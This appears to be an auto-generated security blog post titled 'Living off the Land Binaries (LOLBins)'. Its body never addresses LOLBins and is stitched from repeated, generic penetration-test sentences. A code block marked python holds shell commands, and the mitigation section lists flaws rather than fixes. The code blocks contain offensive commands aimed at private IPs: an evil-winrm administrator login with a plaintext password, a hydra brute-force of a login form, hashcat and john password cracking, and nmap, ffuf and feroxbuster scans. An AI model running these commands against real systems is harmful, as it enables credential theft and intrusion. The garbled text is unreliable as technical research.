---
TitleSEO: "Living off the Land Binaries (LOLBins) | ZureFX"
TitlePost: "Living off the Land Binaries (LOLBins)"
Author: "ZureFX"
Description: "Technical research on Living off the Land Binaries (LOLBins). In-depth analysis with PoC and mitigation strategies."
Keywords: "zero day, kernel, cve, exploit development, format string, buffer overflow"
URL: "https://zurefx.github.io/research/research-living-off-the-land-binaries-(lolbins)-398.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/research/research-living-off-the-land-binaries-(lolbins)-398/"
Date: "2024-01-18"
Tags: "Zero Day, Kernel, CVE, Exploit Development, Format String, Buffer Overflow"
Section: "research"
Lang: "en"
main_img: "research-living-off-the-land-binaries-(lolbins)-39"
Permalink: "/research/research-living-off-the-land-binaries-(lolbins)-398.html"
BtnLabel: "Read Research"
Pick: 1
---
## Abstract

### Summary

The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

## Background

### Context

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

### Related Work

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Technical Analysis

### Vulnerability Details

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
evil-winrm -i 10.83.239.50 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.174.112/FUZZ
```

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

### Proof of Concept

The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

```python
feroxbuster -h
nmap -sCV -p22,110,8080 10.122.131.114 -oN scan.txt
nmap -sCV -p5985,27017,389 10.116.192.85 -oN scan.txt
feroxbuster -h
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

### Exploitation Chain

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.244.87 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p143,21,5432 10.124.208.5 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.94.217.249/FUZZ
```

## Impact Assessment

### Risk Analysis

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

## Mitigation

### Short-term Fixes

- Command injection was possible through unsanitized user input in the search functionality.
- The database credentials were hardcoded in the application source code.
- The application stored sensitive credentials in an unencrypted configuration file.

### Long-term Recommendations

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

## Conclusion

### Final Thoughts

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.
